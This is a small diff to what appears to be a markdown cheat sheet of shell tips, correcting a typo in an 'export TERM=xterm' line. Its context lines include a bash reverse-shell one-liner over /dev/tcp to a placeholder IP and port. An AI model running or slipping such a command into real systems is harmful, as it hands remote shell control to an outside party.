@@ -20,7 +20,7 @@
 	- can lookup different languages
 - `env` check shell environment, add variables if not existing
 	- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
-	- `export TERM-xterm`
+	- `export TERM=xterm`
 	- `export SHELL=bash`
 - connect bash to netcat over sockets
 	- `bash -i >& /dev/tcp/<IP>/<port> 0>&1`
